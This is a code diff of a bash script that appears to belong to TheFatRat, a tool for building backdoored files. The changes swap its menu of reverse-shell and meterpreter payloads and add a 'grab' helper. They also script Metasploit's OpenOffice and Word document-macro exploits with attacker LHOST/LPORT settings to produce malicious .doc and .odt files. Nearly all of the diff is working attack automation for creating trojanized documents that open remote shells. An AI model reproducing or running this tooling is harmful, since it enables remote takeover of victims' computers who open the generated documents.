@@ -72,6 +72,7 @@ apkconfig=$path/config/apk.tmp
 unzip=unzip
 temp=$path/temp
 file="config/config.path"
+grab="config/grab.conf"
 meterp="$path/temp/meterpreter.rc"
 outf="app_backdoor.apk"
 msploit=$path/logs/msploit.log
@@ -114,6 +115,16 @@ spinlong2 ()
         sleep 0.02
     done
 }
+# Check if configuration file for grab script exists in /config folder
+# Case grab config does not exist then create a default config with 60 seconds
+if [ ! -f $grab ]
+then
+echo "------------------------------------------------------------" > $grab
+echo "| Timeout configuration for Msfconsole file Grabber Script |" >> $grab
+echo "------------------------------------------------------------" >> $grab
+echo "60" >> $grab
+fi
+
 # Default Local Host & Port file creation function
 function confdefault () {
 clear
@@ -678,15 +689,15 @@ esac
 # Linux multi msfvenom payload selection
 function pldmul() {
 echo ""
-echo -e $orange "  +-----------------------------------------+"
-echo -e $orange "  |$white [$okegreen 1$white ]$yellow python/meterpreter/reverse_tcp$orange    |"
-echo -e $orange "  |$white [$okegreen 2$white ]$yellow linux/x86/shell_reverse_tcp$orange       |"
-echo -e $orange "  |$white [$okegreen 3$white ]$yellow linux/x86/meterpreter/reverse_tcp$orange |"
-echo -e $orange "  |$white [$okegreen 4$white ]$yellow osx/armle/shell_reverse_tcp$orange       |"
-echo -e $orange "  |$white [$okegreen 5$white ]$yellow osx/ppc/shell_reverse_tcp$orange         |"
-echo -e $orange "  |$white [$okegreen 6$white ]$yellow bsd/x86/shell/reverse_tcp$orange         |"
-echo -e $orange "  |$white [$okegreen 7$white ]$yellow solaris/x86/shell_reverse_tcp$orange     |"
-echo -e $orange "  +-----------------------------------------+"
+echo -e $orange "  +------------------------------------------+"
+echo -e $orange "  |$white [$okegreen 1$white ]$yellow python/meterpreter/reverse_tcp$orange     |"
+echo -e $orange "  |$white [$okegreen 2$white ]$yellow python/meterpreter/reverse_http$orange    |"
+echo -e $orange "  |$white [$okegreen 3$white ]$yellow python/meterpreter/reverse_https$orange   |"
+echo -e $orange "  |$white [$okegreen 4$white ]$yellow python/meterpreter_reverse_http$orange    |"
+echo -e $orange "  |$white [$okegreen 5$white ]$yellow python/meterpreter_reverse_https$orange   |"
+echo -e $orange "  |$white [$okegreen 6$white ]$yellow python/shell_reverse_tcp$orange           |"
+echo -e $orange "  |$white [$okegreen 7$white ]$yellow python/meterpreter/reverse_tcp_ssl$orange |"
+echo -e $orange "  +------------------------------------------+"
 echo ""
 echo -ne $okegreen "  Choose Payload : ";tput sgr0
 read pld
@@ -695,22 +706,22 @@ case $pld in
 payload="python/meterpreter/reverse_tcp"
 ;;
 2)
-payload="linux/x86/shell_reverse_tcp"
+payload="python/meterpreter/reverse_http"
 ;;
 3)
-payload="linux/x86/meterpreter/reverse_tcp"
+payload="python/meterpreter/reverse_https"
 ;;
 4)
-payload="osx/armle/shell_reverse_tcp"
+payload="python/meterpreter_reverse_http"
 ;;
 5)
-payload="osx/ppc/shell_reverse_tcp"
+payload="python/meterpreter_reverse_https"
 ;;
 6)
-payload="bsd/x86/shell/reverse_tcp"
+payload="python/shell_reverse_tcp"
 ;;
 7)
-payload="solaris/x86/shell_reverse_tcp"
+payload="python/meterpreter/reverse_tcp_ssl"
 ;;
 *)
 echo ""
@@ -2923,6 +2934,7 @@ function microsploit() {
 #code by edo maland > screetsec
 #part of fatrat feature
 #compatible with metasploit metasploit v4.14.0-dev { new payload in metasp 2017 like macro}
+rm -rf $msploit >/dev/null 2>&1
 
 APPNAME='Microsfot Metasploit Packet [ Easy ]'
 VERSION='1.0.0'
@@ -3003,19 +3015,24 @@ case $choice in
           echo "set LPORT $yourport" >> $meterp
           echo "set FILENAME $fira.doc" >> $meterp
           echo "exploit" >> $meterp
-          echo "exit -y" >> $meterp
           msploitr
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee temp/xterm.tmp"
+          msft="$path/temp/msff"
+          echo "$fira.doc" > "$msft" 
+          chmod +x "$path/grab" > /dev/null 2>&1
+
+#On this option grab script must be used to get the generated exploit by msfconsole 
+#With option on msfconsole exit -y , msfconsole is not able to generate the doc file properly 
+
+          gnome-terminal -t "grab" --geometry=600x400 --working-directory="$path" -e "bash -c '$path/grab.sh'; bash"
+         	xterm -T "Microsploit" -geometry 110x23 -e "$msfconsole -r $meterp | tee temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+          rm -rf $path/temp/msff >/dev/null 2>&1
           cat $path/temp/xterm.tmp | while read LINE
                 do
                 echo $LINE >> $msploit
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
-
-         	echo ""
-         	mv ~/.msf4/local/$fira.doc $path/output/$fira.doc >/dev/null 2>&1
-         	echo -e $okegreen""
+      	    	echo -e $okegreen""
                 fidoc=$path/output/$fira.doc
                 if [ -f "$fidoc" ]
                 then
@@ -3375,23 +3392,29 @@ fi
           rm -rf $path/temp/* >/dev/null 2>&1
           touch $meterp
           echo "use exploit/multi/misc/openoffice_document_macro" >$meterp
+          echo "set target 0" >> $meterp
           echo "set PAYLOAD $payload" >> $meterp
           echo "set LHOST $yourip" >> $meterp
           echo "set LPORT $yourport" >> $meterp
           echo "set FILENAME $fira.odt" >> $meterp
           echo "set BODY $bodys" >> $meterp
           echo "exploit" >> $meterp
-          echo "exit -y" >> $meterp
           msploitr
-          xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
+          msft="$path/temp/msff"
+          echo "$fira.odt" > "$msft" 
+          chmod +x "$path/grab" > /dev/null 2>&1
+
+#On this option grab script must be used to get the generated exploit by msfconsole 
+#With option on msfconsole exit -y , msfconsole is not able to generate the odt file properly 
+          gnome-terminal -t "grab" --geometry=600x400 --working-directory="$path" -e "bash -c '$path/grab.sh'; bash"
+          xterm -T "Microsploit" -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+          rm -rf $msff >/dev/null 2>&1
                 cat $path/temp/xterm.tmp | while read LINE
                 do
                 echo $LINE >> $msploit
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
-         	echo ""
-         	mv ~/.msf4/local/$fira.odt $path/output/$fira.odt >>$msploit 2>&1
          	echo -e $okegreen""
          	fidoc=$path/output/$fira.odt
                 if [ -f "$fidoc" ]
@@ -3461,23 +3484,30 @@ fi
           rm -rf $path/temp/* >/dev/null 2>&1
           touch $meterp
           echo "use exploit/multi/misc/openoffice_document_macro" >$meterp
+          echo "set target 1" >> $meterp
           echo "set PAYLOAD $payload" >> $meterp
           echo "set LHOST $yourip" >> $meterp
           echo "set LPORT $yourport" >> $meterp
           echo "set FILENAME $fira.odt" >> $meterp
           echo "set BODY $bodys" >> $meterp
           echo "exploit" >> $meterp
-          echo "exit -y" >> $meterp
           msploitr
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
+          msft="$path/temp/msff"
+          echo "$fira.odt" > "$msft" 
+          chmod +x "$path/grab" > /dev/null 2>&1
+
+#On this option grab script must be used to get the generated exploit by msfconsole 
+#With option on msfconsole exit -y , msfconsole is not able to generate the odt file properly 
+          gnome-terminal -t "grab" --geometry=600x400 --working-directory="$path" -e "bash -c '$path/grab.sh'; bash"
+         	xterm -T "Microsploit" -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+          rm -rf $path/temp/msff >/dev/null 2>&1
                 cat $path/temp/xterm.tmp | while read LINE
                 do
                 echo $LINE >> $msploit
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.odt $path/output/$fira.odt >>$msploit 2>&1
          	echo -e $okegreen""
          	fidoc=$path/output/$fira.odt
                 if [ -f "$fidoc" ]
